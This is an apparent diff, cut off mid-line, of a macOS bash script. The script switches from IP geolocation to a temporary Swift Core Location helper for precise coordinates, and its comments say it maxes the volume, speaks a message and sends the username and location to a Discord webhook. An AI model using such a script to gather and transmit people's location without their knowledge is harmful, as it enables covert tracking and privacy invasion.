@@ -1,53 +1,71 @@
 #!/bin/bash
-# This script retrieves your approximate geolocation using your public IP (via ip-api.com),
-# opens a map with your coordinates, sets your system volume to maximum,
-# speaks a custom message (or a default one based on your location),
-# and sends the collected information (with timestamp and username) to a Discord webhook.
+# This script uses macOS’s Core Location (via a temporary Swift script) to get your precise location,
+# opens a map with your coordinates, sets your volume to maximum, speaks a message,
+# and sends the information (timestamp, username, latitude, longitude, and message) to a Discord webhook.
 #
 # Requirements:
 # - macOS
-# - curl, python3, osascript, say (usually available by default)
+# - Xcode Command Line Tools (for Swift)
+# - curl, osascript, say, and python3 (typically available by default)
 #
 # Usage:
 #   ./location_script.sh "Your custom message here"
-# If no message is provided, a default message based on your location is spoken.
+# If no message is provided, a default message is used.
 
-# Retrieve geolocation information from ip-api.com
-geo_json=$(curl -s http://ip-api.com/json)
+# Write a temporary Swift script to get location using Core Location
+swift_script=$(mktemp /tmp/getlocation.XXXX.swift)
+cat << 'EOF' > "$swift_script"
+#!/usr/bin/env swift
+import Foundation
+import CoreLocation
 
-# Use python3 to parse JSON and extract fields
-latitude=$(echo "$geo_json" | python3 -c "import sys, json; print(json.load(sys.stdin).get('lat', ''))")
-longitude=$(echo "$geo_json" | python3 -c "import sys, json; print(json.load(sys.stdin).get('lon', ''))")
-city=$(echo "$geo_json" | python3 -c "import sys, json; print(json.load(sys.stdin).get('city', ''))")
-region=$(echo "$geo_json" | python3 -c "import sys, json; print(json.load(sys.stdin).get('regionName', ''))")
-country=$(echo "$geo_json" | python3 -c "import sys, json; print(json.load(sys.stdin).get('country', ''))")
+class LocationDelegate: NSObject, CLLocationManagerDelegate {
+    var result: String?
+    var locationManager: CLLocationManager!
 
-# Check that latitude and longitude were retrieved
-if [ -z "$latitude" ] || [ -z "$longitude" ]; then
-    echo "Failed to retrieve geolocation."
-    exit 1
-fi
+    override init() {
+        super.init()
+        locationManager = CLLocationManager()
+        locationManager.delegate = self
+        locationManager.desiredAccuracy = kCLLocationAccuracyBest
+    }
 
-echo "Your location: Latitude $latitude, Longitude $longitude"
-echo "Location details: $city, $region, $country"
+    func start() {
+        // Request permission (this will prompt the user on first run)
+        locationManager.requestWhenInUseAuthorization()
+        locationManager.startUpdatingLocation()
+    }
 
-# Construct Google Maps URL and open it in the default browser
-map_url="https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}"
-echo "Opening map: $map_url"
-open "$map_url"
+    func locationManager(_ manager: CLLocationManager, didUpdateLocations locations: [CLLocation]) {
+        if let loc = locations.first {
+            // Output the latitude and longitude separated by a space
+            result = "\(loc.coordinate.latitude) \(loc.coordinate.longitude)"
+            locationManager.stopUpdatingLocation()
+            CFRunLoopStop(CFRunLoopGetCurrent())
+        }
+    }
 
-# Set system volume to maximum using AppleScript
-osascript -e 'set volume output volume 100'
+    func locationManager(_ manager: CLLocationManager, didFailWithError error: Error) {
+        result = "error"
+        CFRunLoopStop(CFRunLoopGetCurrent())
+    }
+}
 
-# Determine the message to speak:
-# If a custom message is provided as an argument, use it; otherwise, use a default message.
-if [ -n "$1" ]; then
-    message="$1"
-else
-    message="Your approximate location is $city, $region, $country."
-fi
+let delegate = LocationDelegate()
+delegate.start()
+CFRunLoopRun()
+if let res = delegate.result {
+    print(res)
+}
+EOF
 
-echo "Speaking message: $message"
-say "$message"
+# Execute the Swift script and capture its output
+location_data=$(swift "$swift_script")
+rm "$swift_script"
 
-# Get the current username for logging purposes
+# Parse the output: expect "latitude longitude"
+lat=$(echo "$location_data" | awk '{print $1}')
+lon=$(echo "$location_data" | awk '{print $2}')
+
+if [ -z "$lat" ] || [ -z "$lon" ] || [ "$lat" = "error" ]; then
+    echo "Failed to retrieve location
